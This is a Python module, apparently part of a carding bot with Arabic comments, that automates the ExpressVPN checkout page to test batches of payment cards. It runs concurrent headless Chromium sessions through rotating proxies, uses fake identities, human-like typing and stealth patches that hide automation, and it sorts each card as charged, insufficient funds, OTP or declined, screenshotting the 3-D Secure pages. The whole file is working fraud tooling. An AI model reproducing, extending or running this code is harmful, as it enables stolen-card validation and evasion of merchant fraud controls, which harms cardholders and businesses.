"""
gates/evpn.py
─────────────
بوابة ExpressVPN Playwright Stealth — OTP + SCREEN

- كل session تشغّل 5 كروت في browser واحد (تقليل overhead الـ launch)
- أقصى 5 sessions متزامنة
- نتائج: CHARGED | INSUFFICIENT_FUNDS | OTP (+ screenshot) | DECLINED | ERROR
- البروكسيات: نفس pool البوت العام
"""

import os
import time
import random
import threading
import logging
import re

logger = logging.getLogger(__name__)

# ── Playwright import (optional — bot يشتغل حتى لو مش مثبّت) ────────────
PLAYWRIGHT_AVAILABLE = False
_stealth_sync = None

try:
    from playwright.sync_api import sync_playwright, TimeoutError as _PWTimeout
    PLAYWRIGHT_AVAILABLE = True
except ImportError:
    _PWTimeout = Exception

try:
    from playwright_stealth import stealth_sync as _stealth_sync_imported
    _stealth_sync = _stealth_sync_imported
except ImportError:
    pass  # بدون stealth مش هتحتاجه في كل الحالات


# ── Config ──────────────────────────────────────────────────────────────────
EVPN_URL = (
    "https://checkout.expressvpn.com/payment"
    "?offer_id=pp_01kxqxwj9wfevb3fpf76q05anb"
    "&cur=usd"
    "&pricing_table_id=pt_01ktv9j149fap9pjqv74yh6w6a"
    "&product_type=vpn"
)

CARDS_PER_SESSION = 5
MAX_SESSIONS      = 5

_EVPN_SEMAPHORE = threading.Semaphore(MAX_SESSIONS)

# {card_str → bytes} — screenshots for OTP results
evpn_screenshots: dict = {}
_evpn_ss_lock = threading.Lock()


# ────────────────────────────────────────────────────────────────────────────
# Proxy helpers
# ────────────────────────────────────────────────────────────────────────────
_BRIGHTDATA_HOST_SUFFIX = "superproxy.io"
# HTTP(S) port of the Bright Data endpoint (the SOCKS5 port is 22228).
# Override with BRIGHTDATA_HTTP_PORT if the zone uses a different port.
_BRIGHTDATA_HTTP_PORT = os.environ.get("BRIGHTDATA_HTTP_PORT", "22225").strip() or "22225"


def _pw_proxy(proxy_str: str | None) -> dict | None:
    """Convert any proxy string → playwright proxy dict."""
    if not proxy_str:
        return None
    s = str(proxy_str).strip()
    # socks5h → socks5 (playwright doesn't know socks5h)
    if s.startswith("socks5h://"):
        s = "socks5://" + s[len("socks5h://"):]

    if "://" in s:
        from urllib.parse import urlparse, unquote
        p = urlparse(s)
        scheme    = p.scheme
        host      = p.hostname
        port      = p.port

        # Chromium rejects SOCKS5 proxies that require username/password.
        # For Bright Data, use the HTTP endpoint of the same host instead
        # (same credentials, same session username → same rotating IP).
        if scheme.startswith("socks5") and p.username:
            if host and host.endswith(_BRIGHTDATA_HOST_SUFFIX):
                scheme = "http"
                port   = _BRIGHTDATA_HTTP_PORT
            else:
                logger.warning(
                    f"[EVPN] socks5 proxy with credentials on {host}:{port} is not "
                    f"supported by Chromium; browser launch will likely fail"
                )

        result = {"server": f"{scheme}://{host}:{port}"}
        if p.username:
            result["username"] = unquote(p.username)
            result["password"] = unquote(p.password or "")
        return result

    if "@" in s:
        creds, host_port = s.rsplit("@", 1)
        parts = creds.split(":", 1)
        user  = parts[0]
        pw    = parts[1] if len(parts) > 1 else ""
        return {"server": f"http://{host_port}", "username": user, "password": pw}

    return {"server": f"http://{s}"}


# ────────────────────────────────────────────────────────────────────────────
# Human-like interaction helpers
# ────────────────────────────────────────────────────────────────────────────
def _human_type(locator, text: str, delay_base: int = 60):
    """Type text character by character with random delays."""
    locator.click()
    time.sleep(random.uniform(0.15, 0.35))
    for ch in text:
        locator.type(ch, delay=delay_base + random.randint(-20, 40))
        if random.random() < 0.08:
            time.sleep(random.uniform(0.04, 0.12))


def _fill_field(page, selector: str, value: str) -> bool:
    """
    Fill a field — tries: direct locator → all frames → JS eval.
    Returns True on success.
    """
    # 1. Direct on page
    try:
        loc = page.locator(selector).first
        if loc.count() > 0:
            loc.scroll_into_view_if_needed(timeout=3000)
            _human_type(loc, value)
            return True
    except Exception:
        pass

    # 2. Search in all frames (Stripe / payment iframe)
    for frame in page.frames:
        try:
            loc = frame.locator(selector).first
            if loc.count() > 0:
                _human_type(loc, value)
                return True
        except Exception:
            continue

    # 3. JavaScript fallback (shadow DOM edge cases)
    try:
        esc_val = value.replace("'", "\\'")
        sel_esc = selector.replace("'", "\\'")
        page.evaluate(
            f"""(function(){{
                var el = document.querySelector('{sel_esc}');
                if (!el) return;
                el.focus();
                var nv = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype,'value');
                if (nv) nv.set.call(el,'{esc_val}');
                else el.value = '{esc_val}';
                el.dispatchEvent(new Event('input',  {{bubbles:true}}));
                el.dispatchEvent(new Event('change', {{bubbles:true}}));
            }})()"""
        )
        return True
    except Exception:
        pass

    return False


# ────────────────────────────────────────────────────────────────────────────
# OTP / 3DS detection
# ────────────────────────────────────────────────────────────────────────────
_OTP_URL_KEYWORDS = (
    "3ds", "acs", "challenge", "safekey", "securecheck",
    "authenticate", "verify", "bank", "issuer", "3d-secure",
)
_OTP_TEXT_KEYWORDS = (
    "3d secure", "3ds", "safekey", "authentication required",
    "one-time", "otp", "verify your card", "secure code",
    "enter the code", "authorization code",
)


def _has_otp(page) -> bool:
    """Check page + all frames for OTP/3DS indicators."""
    # Frame URLs
    for frame in page.frames:
        url = frame.url.lower()
        if any(k in url for k in _OTP_URL_KEYWORDS):
            return True

    # Page text (fast check)
    try:
        body = page.locator("body").inner_text(timeout=3000).lower()
        if any(k in body for k in _OTP_TEXT_KEYWORDS):
            return True
    except Exception:
        pass

    # HTML content check
    try:
        html = page.content().lower()
        # Stripe 3DS challenge iframes
        if "stripe3ds" in html or "stripe-3ds" in html or "3d_secure_2" in html:
            return True
        if any(k in html for k in _OTP_TEXT_KEYWORDS):
            return True
    except Exception:
        pass

    return False


def _extract_error(page) -> str:
    """Try to extract meaningful error text from the page."""
    selectors = [
        '[class*="error"]',
        '[role="alert"]',
        '[class*="alert"]',
        '[class*="message"]:not(button)',
    ]
    for sel in selectors:
        try:
            for el in page.locator(sel).all()[:3]:
                txt = el.inner_text(timeout=1500).strip()
                if txt and 5 < len(txt) < 200:
                    return txt
        except Exception:
            continue
    return "Declined"


# ────────────────────────────────────────────────────────────────────────────
# Core: check one card in an already-open page
# ────────────────────────────────────────────────────────────────────────────
def _check_one(page, card_str: str, identity_fn) -> tuple[str, str]:
    """
    Navigate to checkout and test one card.
    Returns (status, reason).
    On OTP: stores screenshot in evpn_screenshots[card_str].
    """
    parts = card_str.split("|")
    if len(parts) != 4:
        return "ERROR", "Bad card format"
    cc, mm, yyyy, cvv = parts
    if len(yyyy) == 2:
        yyyy = "20" + yyyy
    exp = f"{mm}/{yyyy[-2:]}"

    ident   = identity_fn()
    t_start = time.time()

    try:
        page.goto(EVPN_URL, wait_until="domcontentloaded", timeout=35000)
        time.sleep(random.uniform(1.2, 2.2))

        # ── Email ──────────────────────────────────────────────────────────
        _fill_field(page, 'input[name="checkout[email]"]',    ident["email"]) or \
        _fill_field(page, 'input[autocomplete="email"]',       ident["email"]) or \
        _fill_field(page, 'input[placeholder*="email" i]',    ident["email"])
        time.sleep(random.uniform(0.3, 0.6))

        # ── Cardholder name ────────────────────────────────────────────────
        _fill_field(page, 'input[placeholder="Cardholder name"]', ident["name"]) or \
        _fill_field(page, 'input[autocomplete="cc-name"]',         ident["name"]) or \
        _fill_field(page, 'input[placeholder*="name" i]',          ident["name"])
        time.sleep(random.uniform(0.3, 0.6))

        # ── Card number ────────────────────────────────────────────────────
        _fill_field(page, "#card-number-input",       cc)
        time.sleep(random.uniform(0.25, 0.5))

        # ── Expiry ─────────────────────────────────────────────────────────
        _fill_field(page, "#expiry-input",            exp)
        time.sleep(random.uniform(0.25, 0.5))

        # ── CVV ────────────────────────────────────────────────────────────
        _fill_field(page, "#cvv-input",               cvv)
        time.sleep(random.uniform(0.4, 0.8))

        # ── Submit ─────────────────────────────────────────────────────────
        submitted = False
        for btn_sel in [
            'button:has-text("Subscribe with Card")',
            '[data-slot="button"]:has-text("Subscribe")',
            'button[type="submit"]:has-text("Subscribe")',
            'button:has-text("Subscribe")',
        ]:
            try:
                loc = page.locator(btn_sel).first
                if loc.count() > 0:
                    loc.click(timeout=5000)
                    submitted = True
                    break
            except Exception:
                continue

        if not submitted:
            logger.warning(f"[EVPN] {cc[:6]}... submit button not found")

        # ── Wait for result ────────────────────────────────────────────────
        try:
            page.wait_for_load_state("networkidle", timeout=22000)
        except Exception:
            pass
        time.sleep(random.uniform(2.5, 4.0))

        elapsed = int(time.time() - t_start)

        # ── OTP / 3DS check ────────────────────────────────────────────────
        if _has_otp(page):
            try:
                ss = page.screenshot(full_page=True, type="png")
            except Exception:
                ss = None
            if ss:
                with _evpn_ss_lock:
                    evpn_screenshots[card_str] = ss
            return "OTP", f"3D-Secure challenge — {elapsed}s"

        # ── Parse page result ──────────────────────────────────────────────
        try:
            html = page.content().lower()
        except Exception:
            html = ""

        if any(k in html for k in (
            "thank you", "your subscription", "account created",
            "successfully", "welcome to expressvpn", "you're all set",
        )):
            return "CHARGED", f"Subscription successful — {elapsed}s"

        if any(k in html for k in ("insufficient funds", "insufficient_funds", "not enough funds")):
            return "INSUFFICIENT_FUNDS", f"Insufficient funds — {elapsed}s"

        if any(k in html for k in (
            "card was declined", "payment declined", "card declined",
            "your card has been declined",
        )):
            err = _extract_error(page)
            return "DECLINED", err or f"Card declined — {elapsed}s"

        # Check for generic visible error
        err = _extract_error(page)
        if err and err.lower() not in ("declined", "error"):
            return "DECLINED", f"{err} — {elapsed}s"

        # Timed out with no clear result
        return "ERROR", f"No clear result after {elapsed}s"

    except _PWTimeout:
        return "ERROR", "Page/action timeout"
    except Exception as exc:
        logger.error(f"[EVPN] {cc[:6]}... exception: {exc}")
        return "ERROR", str(exc)[:90]


# ────────────────────────────────────────────────────────────────────────────
# Session: one browser → up to CARDS_PER_SESSION cards
# ────────────────────────────────────────────────────────────────────────────
def _run_session(cards_batch: list, proxy_str: str | None, identity_fn) -> dict:
    """
    Launch one headless Chromium session and check up to 5 cards.
    Returns {card_str: (status, reason)}.
    """
    results = {}
    pw_proxy = _pw_proxy(proxy_str)

    # UA for this session
    ua = random.choice([
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
    ])

    try:
        from playwright.sync_api import sync_playwright
    except ImportError:
        for c in cards_batch:
            results[c] = ("ERROR", "Playwright not installed")
        return results

    with sync_playwright() as pw:
        launch_args = {
            "headless": True,
            "args": [
                "--no-sandbox",
                "--disable-setuid-sandbox",
                "--disable-dev-shm-usage",
                "--disable-blink-features=AutomationControlled",
                "--disable-infobars",
                "--window-size=1280,720",
                "--ignore-certificate-errors",
            ],
        }
        if pw_proxy:
            launch_args["proxy"] = pw_proxy

        try:
            browser = pw.chromium.launch(**launch_args)
        except Exception as exc:
            _srv = pw_proxy["server"] if pw_proxy else "none"
            logger.error(
                f"[EVPN] browser launch failed (proxy server: {_srv}): "
                f"{type(exc).__name__}: {exc}"
            )
            for c in cards_batch:
                results[c] = ("ERROR", f"Browser launch: {str(exc)[:60]}")
            return results

        for card_str in cards_batch:
            ctx = browser.new_context(
                viewport={"width": 1280, "height": 720},
                user_agent=ua,
                locale="en-US",
                timezone_id="America/New_York",
                extra_http_headers={
                    "Accept-Language": "en-US,en;q=0.9",
                },
            )
            page = ctx.new_page()

            # Apply stealth patches
            if _stealth_sync:
                try:
                    _stealth_sync(page)
                except Exception:
                    pass
            else:
                # Manual basic evasion
                try:
                    page.add_init_script("""
                        Object.defineProperty(navigator,'webdriver',{get:()=>undefined});
                        Object.defineProperty(navigator,'plugins',{get:()=>[1,2,3,4,5]});
                        Object.defineProperty(navigator,'languages',{get:()=>['en-US','en']});
                        window.chrome={runtime:{}};
                    """)
                except Exception:
                    pass

            try:
                status, reason = _check_one(page, card_str, identity_fn)
                results[card_str] = (status, reason)
                logger.info(f"[EVPN] {card_str[:16]}... → {status}: {reason[:60]}")
            except Exception as exc:
                results[card_str] = ("ERROR", str(exc)[:80])
                logger.error(f"[EVPN] {card_str[:16]}... unexpected: {exc}")
            finally:
                try:
                    ctx.close()
                except Exception:
                    pass

            # Delay between cards in same session
            time.sleep(random.uniform(2.0, 4.0))

        try:
            browser.close()
        except Exception:
            pass

    return results


# ────────────────────────────────────────────────────────────────────────────
# Public API
# ────────────────────────────────────────────────────────────────────────────
def check_evpn_gate(card_str: str, proxy: str | None, identity_fn) -> tuple[str, str]:
    """
    Check a single card via ExpressVPN Playwright gate.
    Thread-safe — uses semaphore to limit concurrent sessions.
    Screenshot (if OTP) stored in evpn_screenshots[card_str].
    Returns (status, reason).
    """
    if not PLAYWRIGHT_AVAILABLE:
        return "ERROR", "Playwright not installed on this server"

    with _EVPN_SEMAPHORE:
        res = _run_session([card_str], proxy, identity_fn)
    return res.get(card_str, ("ERROR", "Session returned no result"))


def check_evpn_bulk(
    cards: list,
    proxy_getter,
    identity_fn,
    progress_cb=None,
) -> dict:
    """
    Check many cards using up to MAX_SESSIONS concurrent browser sessions
    with CARDS_PER_SESSION cards each.

    Args:
        cards       : list of card strings 'cc|mm|yyyy|cvv'
        proxy_getter: callable() → proxy string (called once per session)
        identity_fn : callable() → identity dict
        progress_cb : optional callable(card_str, status, reason) called per card

    Returns:
        {card_str: (status, reason)}
    """
    if not PLAYWRIGHT_AVAILABLE:
        return {c: ("ERROR", "Playwright not installed") for c in cards}

    # Split into batches of CARDS_PER_SESSION
    batches = [cards[i:i + CARDS_PER_SESSION] for i in range(0, len(cards), CARDS_PER_SESSION)]

    all_results: dict = {}
    lock = threading.Lock()

    def _batch_worker(batch):
        proxy = proxy_getter() if callable(proxy_getter) else proxy_getter
        with _EVPN_SEMAPHORE:
            try:
                batch_res = _run_session(batch, proxy, identity_fn)
            except Exception as exc:
                batch_res = {c: ("ERROR", str(exc)[:80]) for c in batch}

        with lock:
            all_results.update(batch_res)

        if progress_cb:
            for card_str, (status, reason) in batch_res.items():
                try:
                    progress_cb(card_str, status, reason)
                except Exception:
                    pass

    threads = [threading.Thread(target=_batch_worker, args=(b,), daemon=True) for b in batches]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    return all_results
